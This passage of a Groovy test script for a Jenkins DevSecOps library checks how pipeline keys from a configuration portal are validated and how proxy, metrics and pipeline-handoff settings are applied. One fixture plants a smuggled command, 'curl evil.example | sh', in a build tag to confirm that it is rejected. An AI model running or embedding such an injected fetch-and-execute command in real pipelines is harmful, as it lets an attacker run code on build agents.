import devsecops.test.FakeAbort
import devsecops.test.FakeCpsScript
import devsecops.test.FakeFlowInterruptedException
import devsecops.test.FakeRemoteHandle
import devsecops.test.FakeScript
import devsecops.test.OneViewFixtures
import devsecops.test.SandboxHarness
import groovy.json.JsonSlurperClassic
import org.yaml.snakeyaml.Yaml

File root = new File(args.length > 0 ? args[0] : '.').canonicalFile
File srcDir = new File(root, 'src')
File stubDir = new File(root, 'test/sandbox/stub')
File varsDir = new File(root, 'vars')

int failures = 0
Closure check = { String name, boolean ok, Object detail ->
    if (ok) {
        println "PASS  ${name}"
    } else {
        failures++
        println "FAIL  ${name}"
        if (detail) println "      ${detail}"
    }
}

Map gui = new JsonSlurperClassic().parseText(new File(root, 'test/fixtures/oneview/certscanner-gui-full.json').text) as Map
Map backend = new JsonSlurperClassic().parseText(new File(root, 'test/fixtures/oneview/certscanner-backend-api-full.json').text) as Map
Yaml yaml = new Yaml()
String securityJob = 'DevSecOps/CertScanner/security'
String defaultsText = new File(root, 'test/fixtures/defaults.yaml').text
String configText = new File(root, 'test/fixtures/CertScanner/config.yaml').text

Closure changed = { Map document, Map pipeline ->
    Map copy = OneViewFixtures.copy(document)
    (copy.pipeline as Map).putAll(pipeline)
    return copy
}

Closure jenkins = { Map env ->
    FakeScript j = new FakeScript()
    j.resourcesDir = new File(root, 'resources')
    j.resources['com/bbh/devsecops/defaults.yaml'] = defaultsText
    j.env.vars.putAll([BUILD_NUMBER: '42', JOB_NAME: 'DevSecOps/CertScanner', ONEVIEW_URL: OneViewFixtures.ONEVIEW_URL])
    (env ?: [:]).each { k, v -> if (v == null) j.env.vars.remove(k) else j.env.vars.put(k as String, v as String) }
    return j
}

Closure failureOf = { Throwable t -> SandboxHarness.rejectionOf(t) ?: t.message ?: t.toString() }

Closure load = { FakeScript j, String variant, Map jenkinsfile ->
    SandboxHarness harness = new SandboxHarness(srcDir, stubDir)
    def state = null
    def loader = null
    String error = ''
    try {
        harness.run {
            state = harness.type('com.bbh.core.PipelineState').newInstance()
            loader = harness.type('com.bbh.config.ConfigLoader').newInstance(j, state)
            loader.load(variant, jenkinsfile)
        }
    } catch (Throwable t) {
        error = failureOf(t)
    }
    return [harness: harness, state: state, loader: loader, error: error]
}

Closure initialize = { Map r ->
    try {
        (r.harness as SandboxHarness).run { r.loader.initialize() }
        return ''
    } catch (Throwable t) {
        return failureOf(t)
    }
}

Closure querySh = { FakeScript j -> j.calls.find { it.startsWith('sh [Read the configuration from OneView] ') } as String }

Closure runWithoutKey = { String name, Map jenkinsfile = [:], Map env = [:], boolean planted = false ->
    FakeScript s = jenkins(env)
    if (planted) s.files['config.yaml'] = configText
    FakeCpsScript entryPoint = new SandboxHarness(srcDir, stubDir).loadVars(varsDir, s)[name] as FakeCpsScript
    String crash = ''
    try {
        new SandboxHarness(srcDir, stubDir).run { entryPoint.call(jenkinsfile) }
    } catch (Throwable t) {
        crash = failureOf(t)
    }
    boolean untouched = entryPoint.executedStages.isEmpty() && !s.files.containsKey('report/pipeline-report.html') && s.calls.isEmpty()
    return [crash: crash, untouched: untouched, probes: s.probes, detail: "${crash} | stages ${entryPoint.executedStages} | calls ${s.calls} | probes ${s.probes}".toString()]
}

String withoutKey = "(projectNames: '<services of this repository>', agentNames: ['<agent label>']"
Map noKey = runWithoutKey('devSecOpsPipeline')
check('no key and no agentNames: the entry point fails before pipeline {} with both ways to configure it',
        noKey.crash.contains("devSecOpsPipeline(pipelineKey: '<key from OneView>')") && noKey.crash.contains('OneView') && noKey.untouched
                && noKey.crash.contains("devSecOpsPipeline${withoutKey})") && noKey.crash.contains('devsecops_config.yaml or config.yaml'),
        noKey.detail)

noKey = runWithoutKey('devSecOpsNexusIqGoldenFixPipeline')
check('no key and no agentNames: the Nexus IQ GoldenFix entry point names its own call and its variant, with and without a key',
        noKey.crash.contains("devSecOpsNexusIqGoldenFixPipeline(pipelineKey: '<key from OneView>')")
                && noKey.crash.contains("devSecOpsApi.configure('nexusiq', [pipelineKey: '<key from OneView>'])") && noKey.untouched
                && noKey.crash.contains("devSecOpsNexusIqGoldenFixPipeline${withoutKey})"),
        noKey.detail)

noKey = runWithoutKey('devSecOpsExtendedPipeline')
check('no key and no agentNames: the extended entry point also names the security job to copy from',
        noKey.crash.contains("devSecOpsExtendedPipeline${withoutKey}, securityPipeline: '<security job>')") && noKey.untouched,
        noKey.detail)

FakeScript j = jenkins([:])
Map r = load(j, 'full', [pipelineKey: 'cert-scanner-gui'])
check('malformed key: refused before anything runs', r.error.contains('is not a key of OneView') && j.calls.isEmpty(),
        "${r.error} | ${j.calls}")

j = jenkins([:])
r = load(j, 'full', [pipelineKey: OneViewFixtures.key(1)])
check('unknown key: not issued by OneView, shown only as a hint',
        r.error == "[ONEVIEW] Key ${OneViewFixtures.hint(OneViewFixtures.key(1))} was not issued by OneView at ${OneViewFixtures.ONEVIEW_URL}".toString(), r.error)

j = jenkins([:])
j.oneView[OneViewFixtures.key(1)] = [keyStatus: 'REVOKED', revokeReason: 'service moved to the Payments team', renderedAt: OneViewFixtures.RENDERED_AT, sha256: OneViewFixtures.sha256(1)]
r = load(j, 'full', [pipelineKey: OneViewFixtures.key(1)])
check('revoked key: the reason is shown with what to do',
        r.error.contains('was invalidated in OneView (The DevSecOps pipeline key was invalidated on 2026-10-06T08:14:19.475Z: service moved to the Payments team); regenerate it in OneView and put the new key in the Jenkinsfile')
                && !r.error.contains(OneViewFixtures.key(1)),
        r.error)

j = jenkins([:])
j.oneViewAnswer = [status: '200', sha256: OneViewFixtures.sha256(1), body: '{}']
r = load(j, 'full', [pipelineKey: OneViewFixtures.key(1)])
check('empty answer: OneView sent no configuration, the build stops', r.error.contains("the answer for key ${OneViewFixtures.hint(OneViewFixtures.key(1))} holds no configuration"), r.error)

j = jenkins([:])
String securityKey = OneViewFixtures.publish(j, changed(gui, [type: 'security']))
r = load(j, 'full', [pipelineKey: securityKey])
check('type mismatch: names the type of the key and the type of the entry point',
        r.error.contains('configures a security pipeline') && r.error.contains('runs the full pipeline'), r.error)

j = jenkins([:])
r = load(j, 'sast', [pipelineKey: OneViewFixtures.publish(j, changed(gui, [type: 'nexusiq']))])
check('type mismatch: a Nexus IQ GoldenFix key run by another entry point is refused',
        r.error.contains('configures a nexusiq pipeline, devSecOpsSASTScanningPipeline runs the sast pipeline'), r.error)

j = jenkins([:])
r = load(j, 'nexusiq', [pipelineKey: OneViewFixtures.publish(j, changed(gui, [type: 'sast']))])
check('type mismatch: the Nexus IQ GoldenFix entry point refuses the key of another pipeline type',
        r.error.contains('configures a sast pipeline, devSecOpsNexusIqGoldenFixPipeline runs the nexusiq pipeline: use the key of the nexusiq pipeline of the service'), r.error)

j = jenkins([:])
List<String> keys = [OneViewFixtures.publish(j, gui), OneViewFixtures.publish(j, changed(backend, [product: 'PAYHUB']))]
r = load(j, 'full', [pipelineKeys: keys])
check('product mismatch: names both products', r.error.contains('belongs to product PAYHUB') && r.error.contains('to product CERTSCANNER'), r.error)

j = jenkins([:])
keys = [OneViewFixtures.publish(j, gui), OneViewFixtures.publish(j, gui)]
r = load(j, 'full', [pipelineKeys: keys])
check('duplicate service: names the keys and the service', r.error.contains('both configure service gui'), r.error)

j = jenkins([:])
keys = [OneViewFixtures.publish(j, backend), OneViewFixtures.publish(j, gui)]
r = load(j, 'full', [pipelineKeys: [' ' + keys[0].toUpperCase() + ' ', keys[1]], projectNames: 'gui', agentNames: ['windows-agent']])
String initError = r.error ? '' : initialize(r)
Map runState = j.files['pipeline-config.yaml'] ? yaml.load(j.files['pipeline-config.yaml']) as Map : [:]
check('several keys: the first key is the primary project and the order is kept everywhere',
        !r.error && !initError && j.env.PROJECT_NAMES == 'backend-api,gui' && r.state.currentProjectName == 'backend-api'
                && (r.state.projectsAllCfg as Map).keySet().toList() == ['backend-api', 'gui']
                && ((runState.projects ?: [:]) as Map).keySet().toList() == ['backend-api', 'gui']
                && j.env.vars.get('ONEVIEW_KEYS') == null && querySh(j) != null && r.state.oneViewKeys == keys,
        "${r.error} ${initError} ${j.env.PROJECT_NAMES} ${r.state.currentProjectName} ${r.state.oneViewKeys}")
check('several keys: the merged configuration is the global defaults under each service, as defaults.yaml under config.yaml was',
        (r.state.projectsAllCfg.gui as Map).sast?.pollTimeoutMin == 50 && (r.state.projectsAllCfg.gui as Map).sast?.scanName == 'cert-scanner-gui-sast'
                && (r.state.cfgDefaults as Map).coverage?.minLine == 60 && r.state.platform?.iosBuildAgent == 'mac002.bbh.com',
        r.state.projectsAllCfg.gui)
Closure oneViewLine = { String key, String services, String sha ->
    j.log.any { String line ->
        String prefix = "[ONEVIEW] key ${OneViewFixtures.hint(key)}: ${services} of CERTSCANNER, rendered ".toString()
        String suffix = ", sha256 ${sha}".toString()
        (line.startsWith(prefix) && line.endsWith(suffix)
                && (line.substring(prefix.length(), line.length() - suffix.length()) ==~ /\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z/))
    }
}
check('several keys: one [ONEVIEW] line per key and one for the ignored Jenkinsfile keys',
        oneViewLine(keys[0], 'backend-api', OneViewFixtures.sha256(1)) && oneViewLine(keys[1], 'gui', OneViewFixtures.sha256(2))
                && j.log.contains('[ONEVIEW] The Jenkinsfile sets projectNames, agentNames; the values from OneView are used instead'),
        j.log.findAll { it.startsWith('[ONEVIEW]') })

String libraryKeyId = ((((yaml.load(defaultsText) as Map).defaults as Map).asoc ?: [:]) as Map).keyId
Map otherKey = OneViewFixtures.copy(backend)
(((otherKey.projects as Map)['backend-api'] as Map).asoc as Map).keyId = 'bbh_0c1d2e3f-4a5b-6c7d-8e9f-a0b1c2d3e4f5'
Map defaultsKey = OneViewFixtures.copy(gui)
[defaultsKey, otherKey].each { Map document -> (document.defaults as Map).asoc = [keyId: 'bbh_oneview-defaults-key', token: 'oneview-defaults-secret'] }
j = jenkins([:])
r = load(j, 'full', [pipelineKeys: [OneViewFixtures.publish(j, defaultsKey), OneViewFixtures.publish(j, otherKey)]])
initError = r.error ?: initialize(r)
String primaryKeyId = j.env.APPSCAN_KEY_ID
if (!initError) r.harness.run { r.loader.switchProject('backend-api') }
check('one AppScan key for every service: APPSCAN_KEY_ID is the key ID of the functional user from the library defaults after the start and after switchProject, not a key of the OneView defaults or of a service, whose key ID is ignored with a [WARN]',
        !initError && libraryKeyId && primaryKeyId == libraryKeyId && j.env.APPSCAN_KEY_ID == libraryKeyId
                && j.log.any { it.startsWith('[WARN] backend-api: asoc.keyId in OneView ignored - ') } && !j.log.any { it.startsWith('[WARN] gui: ') },
        "${initError} | ${primaryKeyId} | ${j.env.APPSCAN_KEY_ID} | ${j.log.findAll { it.startsWith('[WARN]') }}")

j = jenkins([:])
j.resources.remove('com/bbh/devsecops/defaults.yaml')
j.resourcesDir = null
r = load(j, 'full', [pipelineKeys: [OneViewFixtures.publish(j, gui), OneViewFixtures.publish(j, backend)]])
initError = r.error ?: initialize(r)
check('one AppScan key for every service: services without a key start, and when the library defaults cannot be read the start goes on with a [WARN] (SAST and DAST stop later with their own message)',
        !initError && !j.env.APPSCAN_KEY_ID && j.log.any { it.startsWith('[WARN] The library resource com/bbh/devsecops/defaults.yaml cannot be read (') },
        "${initError} | ${j.env.APPSCAN_KEY_ID} | ${j.log.findAll { it.startsWith('[WARN]') }}")

j = jenkins([:])
SandboxHarness apiHarness = new SandboxHarness(srcDir, stubDir)
FakeCpsScript api = apiHarness.loadVars(varsDir, j)['devSecOpsApi'] as FakeCpsScript
String apiError = ''
try {
    apiHarness.run { api.initialize() }
} catch (Throwable t) {
    apiError = failureOf(t)
}
check('initialize() without configure() and without a file names configure() and both file names',
        apiError.contains("devSecOpsApi.configure('<variant>', [pipelineKey: '<key from OneView>'])") && apiError.contains('before devSecOpsApi.initialize()')
                && apiError.contains('neither devsecops_config.yaml nor config.yaml'),
        apiError)

j = jenkins([PROXY_HOST: 'agent-proxy.bbh.com'])
Map platformDoc = OneViewFixtures.copy(gui)
Map environment = (platformDoc.platform as Map).environment as Map
environment.PROXY_HOST = 'oneview-proxy.bbh.com'
environment.PROXY_PORT = 8080
environment.remove('PROXY_USER')
String platformKey = OneViewFixtures.publish(j, platformDoc)
apiHarness = new SandboxHarness(srcDir, stubDir)
api = apiHarness.loadVars(varsDir, j)['devSecOpsApi'] as FakeCpsScript
apiError = ''
Map pipelineConfig = [:]
try {
    apiHarness.run {
        api.configure('full', [pipelineKey: platformKey, appId: 'from-the-jenkinsfile'])
        pipelineConfig = api.pipelineConfig() as Map
        j.onAgent('linux-agent') { api.initialize() }
    }
} catch (Throwable t) {
    apiError = failureOf(t)
}
check('platform values: an agent-level PROXY_HOST wins over OneView, OneView wins over the literal, the literal is the fallback',
        !apiError && j.env.PROXY_HOST == 'agent-proxy.bbh.com' && j.env.PROXY_PORT == '8080' && j.env.PROXY_USER == 'PROXY_ASOCJenk'
                && j.env.APPSCAN_SERVER_URL == 'https://bbh.cloud.appscan.com',
        "${apiError} PROXY_HOST=${j.env.PROXY_HOST} PROXY_PORT=${j.env.PROXY_PORT} PROXY_USER=${j.env.PROXY_USER}")
check('configure(): the AGENT_NAME choices come from OneView and the Jenkinsfile map stays available',
        pipelineConfig.agentNames == ['linux-agent'] && pipelineConfig.appId == 'from-the-jenkinsfile' && pipelineConfig.projectNames == 'gui',
        pipelineConfig.findAll { k, v -> k != 'pipelineKey' })

j = jenkins([:])
keys = [OneViewFixtures.publish(j, gui), OneViewFixtures.publish(j, backend)]
apiHarness = new SandboxHarness(srcDir, stubDir)
api = apiHarness.loadVars(varsDir, j)['devSecOpsApi'] as FakeCpsScript
apiError = ''
try {
    apiHarness.run {
        api.configure('full', [pipelineKeys: keys])
        j.onAgent('linux-agent') {
            api.initialize()
            api.eachProject { String name -> }
            api.feedInfluxDB('')
        }
    }
} catch (Throwable t) {
    apiError = failureOf(t)
}
List<String> influxLines = j.files.findAll { k, v -> (k as String).startsWith('influx_payload_') }.collect { k, v -> v as String }.join('\n').readLines()
check('several keys: the metrics carry the InfluxDB settings of the primary service, not of the service handled last',
        !apiError && j.env.CURRENT_PROJECT_NAME == 'backend-api' && influxLines.any { it.startsWith('pipeline_run,project=CERTSCANNER-gui,env=test,') }
                && !influxLines.any { it.contains('project=CERTSCANNER-backend-api') },
        "${apiError} | ${influxLines.findAll { it.startsWith('pipeline_run,') }}")
String influxSh = j.calls.find { it.contains('curl ') && it.contains('$INFLUX_URL') } ?: ''
check('InfluxDB upload: the token, the address, the payload and the response file reach curl through the environment, the answer of InfluxDB is printed, a curl error or an HTTP status of 300 or more fails the step, and both files are removed',
        influxSh == '''sh set +x
code=$(curl -sS -o "$INFLUX_RESPONSE" -w '%{http_code}' -X POST "$INFLUX_URL" -H "Authorization: Token $INFLUX_TOKEN" --data-binary "@$INFLUX_FILE") || exit $?
echo "[INFLUX] HTTP $code $(cat "$INFLUX_RESPONSE" 2>/dev/null)"
[ "$code" -lt 300 ]
'''
                && j.calls.contains('withCredentials [influxdb-token]') && !j.calls.any { it.contains('fake-INFLUX_TOKEN') }
                && j.calls.any { it ==~ /withEnv \[INFLUX_URL=http:\/\/qcwsecopsmon1\.testbbh\.com:8086\/api\/v2\/write\?org=DevSecOps&bucket=DORA-metrics&precision=s, INFLUX_FILE=influx_payload_(\d+)\.txt, INFLUX_RESPONSE=influx_response_\1\.txt\]/ }
                && j.calls.any { it ==~ /sh rm -f 'influx_payload_(\d+)\.txt' 'influx_response_\1\.txt'/ },
        j.calls.findAll { it.contains('INFLUX') || it.contains('influx_') || it.startsWith('withCredentials') })

j = jenkins([:])
apiHarness = new SandboxHarness(srcDir, stubDir)
api = apiHarness.loadVars(varsDir, j)['devSecOpsApi'] as FakeCpsScript
keys = [OneViewFixtures.publish(j, gui)]
apiError = ''
try {
    apiHarness.run {
        api.configure('full', [pipelineKeys: keys])
        j.unix = false
        j.onAgent('windows-agent') {
            api.initialize()
            api.feedInfluxDB('')
        }
    }
} catch (Throwable t) {
    apiError = failureOf(t)
}
String influxPs = j.calls.find { it.contains('curl.exe ') } ?: ''
check('InfluxDB upload on Windows: the same environment reaches curl.exe, the answer of InfluxDB is printed, a curl error or an HTTP status of 300 or more fails the step, and both files are removed',
        !apiError && influxPs == '''powershell $code = curl.exe -sS -o "$env:INFLUX_RESPONSE" -w '%{http_code}' -X POST "$env:INFLUX_URL" -H "Authorization: Token $env:INFLUX_TOKEN" --data-binary "@$env:INFLUX_FILE"
if ($LASTEXITCODE) { exit $LASTEXITCODE }
Write-Host "[INFLUX] HTTP $code $(Get-Content -Raw $env:INFLUX_RESPONSE -ErrorAction SilentlyContinue)"
if ([int]$code -ge 300) { exit 1 }
'''
                && j.calls.contains('withCredentials [influxdb-token]')
                && j.calls.any { it ==~ /withEnv \[INFLUX_URL=\S+, INFLUX_FILE=influx_payload_(\d+)\.txt, INFLUX_RESPONSE=influx_response_\1\.txt\]/ }
                && j.calls.any { it ==~ /powershell Remove-Item -Force 'influx_payload_(\d+)\.txt', 'influx_response_\1\.txt' -ErrorAction SilentlyContinue/ },
        "${apiError} | ${j.calls.findAll { it.contains('INFLUX') || it.contains('influx_') || it.startsWith('withCredentials') }}")

String variablePlace = 'in Manage Jenkins > System > Global properties > Environment variables'
String addressForm = 'https://<host>[:<port>][/<path>], without a user, password, query or spaces'
String notSet = "[ONEVIEW] ONEVIEW_URL is not set: a Jenkins administrator sets it once to the address of OneView, for example https://oneview.apps.bbh.com, ${variablePlace}".toString()
String notAnAddress = "[ONEVIEW] ONEVIEW_URL is not the address of OneView: a Jenkins administrator writes it as ${addressForm}".toString()
j = jenkins([ONEVIEW_URL: null, DSO_PORTAL_DB_URL: 'jdbc:oracle:thin:@//portal-db.bbh.com:1521/DSOPORTAL'])
r = load(j, 'full', [pipelineKey: OneViewFixtures.publish(j, gui)])
check('missing ONEVIEW_URL: says where to set it, nothing runs, the old database URL is ignored',
        r.error == notSet && j.calls.isEmpty(), r.error)

['https://reader:s3cret@oneview.apps.bbh.com', 'jdbc:oracle:thin:@//portal-db.bbh.com:1521/DSOPORTAL',
 'https://oneview.apps.bbh.com/?token=s3cret', 'oneview.apps.bbh.com'].each { String url ->
    FakeScript s = jenkins([ONEVIEW_URL: url])
    Map result = load(s, 'full', [pipelineKey: OneViewFixtures.publish(s, gui)])
    check("ONEVIEW_URL ${url.replace('s3cret', '***')}: refused before anything runs, the value is never repeated",
            result.error == notAnAddress && !result.error.contains('s3cret')
                    && !result.error.contains('portal-db') && s.calls.isEmpty() && !s.log.any { it.contains('s3cret') || it.contains('portal-db') },
            result.error)
}

j = jenkins([ONEVIEW_URL: 'https://oneview.apps.bbh.com/'])
r = load(j, 'full', [pipelineKey: OneViewFixtures.publish(j, gui)])
check('ONEVIEW_URL with a trailing slash: the slash is dropped before the read',
        !r.error && j.calls.any { it.startsWith('withEnv ') && it.contains('ONEVIEW_URL=https://oneview.apps.bbh.com,') }, "${r.error} | ${j.calls}")

[[name: 'that cannot be reached', answer: [status: '000', error: "curl: (7) Failed to connect to oneview.apps.bbh.com port 443 after 3 ms: Couldn't connect to server\n" * 2
        + "curl: (28) Failed to connect to oneview.apps.bbh.com port 443 after 10002 ms: Timeout was reached\n"],
  text: "agent build-agent-7 cannot reach it (curl: (28) Failed to connect to oneview.apps.bbh.com port 443 after 10002 ms: Timeout was reached)"],
 [name: 'with an untrusted certificate', answer: [status: '000', error: 'curl: (60) SSL certificate problem: unable to get local issuer certificate\nMore details here: https://curl.se/docs/sslcerts.html\n\ncurl failed to verify the legitimacy of the server\n'],
  text: 'cannot reach it (curl: (60) SSL certificate problem: unable to get local issuer certificate)'],
 [name: 'missing behind its router', answer: [status: '503', body: '<html><body>Application is not available</body></html>'],
  text: 'it answered HTTP 503;'],
 [name: 'at a wrong address', answer: [status: '404', body: '{"timestamp":"2026-10-06T08:14:19Z","status":404,"error":"Not Found","path":"/api/dso/config"}'],
  text: 'it answered HTTP 404;'],
 [name: 'that fails', answer: [status: '500', body: FakeScript.problem('<key>', 500, 'Request failed', "The portal could not handle the request. The failure is in the portal's log.")],
  text: "it answered HTTP 500 (The portal could not handle the request. The failure is in the portal's log.)"]
].each { Map spec ->
    FakeScript s = jenkins([NODE_NAME: 'build-agent-7', WORKSPACE: '/agent/ws'])
    s.oneViewAnswer = spec.answer
    Map result = load(s, 'full', [pipelineKey: OneViewFixtures.publish(s, gui)])
    check("OneView ${spec.name}: one message with the cause, the address of OneView and the DevSecOps team, the build description says OneView is unavailable",
            result.error.contains(spec.text as String) && result.error.contains("from OneView at ${OneViewFixtures.ONEVIEW_URL}: ")
                    && result.error.endsWith('ask the DevSecOps team') && !result.error.contains('<html>')
                    && s.currentBuild.description == 'OneView unavailable',
            "${result.error} | description ${s.currentBuild.description}")
}

j = jenkins([:])
String leakedKey = OneViewFixtures.publish(j, gui)
j.oneViewAnswer = [status: '000', error: "curl: (28) Failed to read ${OneViewFixtures.ONEVIEW_URL}/api/dso/config/${leakedKey}?format=json\n".toString()]
r = load(j, 'full', [pipelineKey: leakedKey])
check('an error text that holds the key shows only its hint', r.error.contains(OneViewFixtures.hint(leakedKey)) && !r.error.contains(leakedKey), r.error)

j = jenkins([:])
j.oneViewAnswer = [status: '200', body: 'Picked up _JAVA_OPTIONS {']
r = load(j, 'full', [pipelineKey: OneViewFixtures.publish(j, gui)])
check('broken answer: only its length is printed', r.error.contains('is not JSON (25 characters)') && !r.error.contains('Picked up'), r.error)

j = jenkins([ONEVIEW_AGENT: 'oneview-reader && linux'])
j.unix = false
r = load(j, 'full', [pipelineKey: OneViewFixtures.publish(j, gui)])
check('Windows bootstrap agent: refused with the setting to change',
        r.error.contains('set ONEVIEW_AGENT to a Linux or macOS label') && j.calls.contains('node oneview-reader && linux') && querySh(j) == null,
        "${r.error} | ${j.calls}")

j = jenkins([:])
r = load(j, 'full', [pipelineKey: OneViewFixtures.publish(j, gui)])
check('configure() outside a node reads on an agent of ONEVIEW_AGENT, default linux-agent, and says nothing about a name when only the new names are set',
        !r.error && j.calls.contains('node linux-agent') && querySh(j) != null && !j.log.any { it.contains('former name') || it.contains('is ignored') }, j.calls.findAll { !it.startsWith('sh ') })

j = jenkins([NODE_NAME: 'build-agent-7', WORKSPACE: '/agent/ws'])
String inPlaceKey = OneViewFixtures.publish(j, gui)
r = load(j, 'full', [pipelineKey: inPlaceKey])
String script = (querySh(j) ?: '').substring('sh [Read the configuration from OneView] '.length())
String withEnv = j.calls.find { it.startsWith('withEnv ') } ?: ''
check('configure() inside a node reads in place, in a per-build directory below the workspace tmp, without credentials',
        !r.error && !j.calls.any { it.startsWith('node ') || it.startsWith('withCredentials') } && withEnv.contains('ONEVIEW_DIR=/agent/ws@tmp/oneview-42')
                && j.calls.contains('deleteDir /agent/ws@tmp/oneview-42') && !j.files.keySet().any { it.contains('oneview-42') },
        "${r.error} | ${j.calls.findAll { !it.startsWith('sh ') }}")
check('the query script is constant: #!/bin/sh, set +x, no key, one GET per key with retries, the key only in the environment',
        script.startsWith('#!/bin/sh\nset +x\n') && !script.contains(inPlaceKey) && !script.contains('oneview-42') && !script.contains('oneview.apps')
                && script.contains('"$ONEVIEW_URL/api/dso/config/$key?format=json"') && script.contains('--retry 2') && !script.contains('-X ')
                && !script.contains('PORTAL') && !withEnv.contains('PORTAL')
                && withEnv.contains("ONEVIEW_KEYS=${inPlaceKey}") && withEnv.contains("ONEVIEW_URL=${OneViewFixtures.ONEVIEW_URL}"),
        script)

Map extendedGui = changed(gui, [type: 'extended', securityPipeline: securityJob])
Map extendedBackend = changed(backend, [type: 'extended', securityPipeline: securityJob])
Map copied = [projects: [gui: [appId: 'taken-from-the-security-run', delivery: '57-20261006-081500'],
                         'backend-api': [deploy: [openshift: [rd: [buildTag: '213-20261006-081500', projectBuildR: 'elsewhere',
                                                                   internalDockerUrl: 'image-registry.openshift-image-registry.svc:5000/ta-certscanner-build/certscanner-api@sha256:5f1c0ffee']]]]]]

j = jenkins([:])
keys = [OneViewFixtures.publish(j, extendedGui), OneViewFixtures.publish(j, extendedBackend)]
j.files['pipeline-config.yaml'] = yaml.dump(copied)
r = load(j, 'extended', [pipelineKeys: keys])
initError = r.error ?: initialize(r)
runState = j.files['pipeline-config.yaml'] ? yaml.load(j.files['pipeline-config.yaml']) as Map : [:]
Map backendRd = ((((r.state.projectsAllCfg as Map)['backend-api'] as Map)?.deploy as Map)?.openshift as Map)?.rd as Map
check('extended handoff: only the run-time tags of the security run are laid over the own documents, and a delivery value of the security run never replaces the delivery settings',
        !initError && j.env.Security_Pipeline == securityJob && (r.state.projectsAllCfg.gui as Map).delivery != '57-20261006-081500'
                && (r.state.projectsAllCfg.gui as Map).appId == '209f44ac-dd06-4ca0-884e-d944904f8020'
                && backendRd?.buildTag == '213-20261006-081500' && (backendRd?.internalDockerUrl as String)?.endsWith('@sha256:5f1c0ffee')
                && backendRd?.projectBuildR == 'ta-certscanner-build',
        "${initError} | ${backendRd}")
check('extended handoff: the extended run writes its own run-state file with the overlay',
        (((((runState.projects as Map)?.get('backend-api') as Map)?.deploy as Map)?.openshift as Map)?.rd as Map)?.buildTag == '213-20261006-081500'
                && ((runState.projects as Map)?.gui as Map)?.delivery != '57-20261006-081500' && ((runState.projects as Map)?.gui as Map)?.appId == '209f44ac-dd06-4ca0-884e-d944904f8020',
        runState.projects)

j = jenkins([:])
r = load(j, 'extended', [pipelineKeys: [OneViewFixtures.publish(j, extendedGui)]])
initError = r.error ?: initialize(r)
check('extended handoff: a security build from before the OneView integration says what to run',
        initError == "[INIT] The last successful build of ${securityJob} has no pipeline-config.yaml: it predates the OneView integration; run ${securityJob} once".toString(),
        initError)

j = jenkins([:])
j.files['pipeline-config.yaml'] = yaml.dump([projects: [payments: [delivery: '12-20261006-081500']]])
r = load(j, 'extended', [pipelineKeys: [OneViewFixtures.publish(j, extendedGui)]])
initError = r.error ?: initialize(r)
check('extended handoff: a security pipeline that builds other services is refused',
        initError == "[INIT] Security pipeline ${securityJob} builds payments, this key builds gui".toString(), initError)

j = jenkins([:])
j.files['pipeline-config.yaml'] = yaml.dump([projects: ['backend-api': [deploy: [openshift: [rd: [buildTag: '213; curl evil.example | sh']]]]]])
r = load(j, 'extended', [pipelineKeys: [OneViewFixtures.publish(j, extendedBackend)]])
initError = r.error ?: initialize(r)
check('extended handoff: a tag that is not a plain tag is refused before any step uses it',
        initError.contains('pipeline-config.yaml of DevSecOps/CertScanner/security holds an invalid deploy.openshift.rd.buildTag for backend-api'), initError)

j = jenkins([:])
Map standalone = changed(backend, [type: 'extended'])
((((standalone.projects as Map)['backend-api'] as Map).deploy as Map).openshift as Map).rd.buildTag = '200-20260901-000000'
r = load(j, 'extended', [pipelineKeys: [OneViewFixtures.publish(j, standalone)]])
initError = r.error ?: initialize(r)
check('standalone extended pipeline: no copy, its own documents with the pinned tag',
        !initError && !j.env.Security_Pipeline && !j.calls.any { it.startsWith('copyArtifacts') }
                && ((((r.state.projectsAllCfg as Map)['backend-api'] as Map).deploy as Map).openshift as Map).rd.buildTag == '200-20260901-000000'
                && j.files.containsKey('pipeline-config.yaml'),
        initError)

Closure nexusIqInit = { String variant, List<Map> documents ->
    FakeScript s = jenkins([:])
    Map loaded = load(s, variant, [pipelineKeys: documents.collect { OneViewFixtures.publish(s, it) }])
    return loaded.error ?: initialize(loaded)
}
Map noApplication = changed(gui, [type: 'nexusiq'])
((((noApplication.projects as Map).gui as Map).tools as Map).nexusIq as Map).remove('application')
Map noPatterns = changed(backend, [type: 'nexusiq'])
((((noPatterns.projects as Map)['backend-api'] as Map).tools as Map).nexusIq as Map).scanPatterns = []
String unscannedError = nexusIqInit('nexusiq', [noApplication, noPatterns])
String fullError = nexusIqInit('full', [changed(noApplication, [type: 'full'])])
String completeError = nexusIqInit('nexusiq', [changed(gui, [type: 'nexusiq']), changed(backend, [type: 'nexusiq'])])
check('Nexus IQ GoldenFix pipeline: a service without a Nexus IQ application stops the build at the start, a service without scan patterns gets them from the auto-resolve, the other pipelines and complete services are not affected',
        unscannedError == '[INIT] The Nexus IQ GoldenFix pipeline would scan nothing for gui: set tools.nexusIq.application and its scanPatterns for the service in OneView'
                && !fullError && !completeError,
        "${unscannedError} | ${fullError} | ${completeError}")

j = jenkins([:])
SandboxHarness buildHarness = new SandboxHarness(srcDir, stubDir)
List<Map> triggered = []
j.steps['triggerRemoteJob'] = { Map a -> triggered << a; new FakeRemoteHandle(buildResult: 'SUCCESS', buildUrl: 'https://jenkins-b.bbh.com/job/smoke/12/') }
String buildError = ''
try {
    buildHarness.run {
        def state = buildHarness.type('com.bbh.core.PipelineState').newInstance()
        def os = buildHarness.type('com.bbh.core.OsHelper').newInstance(j)
        def policy = buildHarness.type('com.bbh.core.PolicyEngine').newInstance(j, state, os)
        def build = buildHarness.type('com.bbh.build.BuildService').newInstance(j, state, os, policy)
        build.runSingleTestJob('Smoke tests', [name: 'login smoke', type: 'remote', job: 'https://jenkins-b.bbh.com/job/smoke/job/login',
                                               tokenCredentialsId: 'cert-scanner-remote-token', credentialsId: 'remote-jenkins-api-token'], 0, 15)
        build.runSingleTestJob('Smoke tests', [name: 'legacy smoke', type: 'remote', job: 'https://jenkins-b.bbh.com/job/smoke/job/legacy', token: 'plain-token'], 1, 15)
    }
} catch (Throwable t) {
    buildError = failureOf(t)
}
check('remote test jobs: tokenCredentialsId is bound from Jenkins credentials, a plain token still works',
        !buildError && triggered.size() == 2 && triggered[0].token == 'fake-REMOTE_JOB_TOKEN' && triggered[1].token == 'plain-token'
                && j.calls.count('withCredentials [cert-scanner-remote-token]') == 1 && j.env.REMOTE_JOB_TOKEN == null,
        "${buildError} | ${triggered.collect { it.token }} | ${j.calls}")

String noKeyError = "[ONEVIEW] No pipeline key: OneView issues one per service on the product page. " +
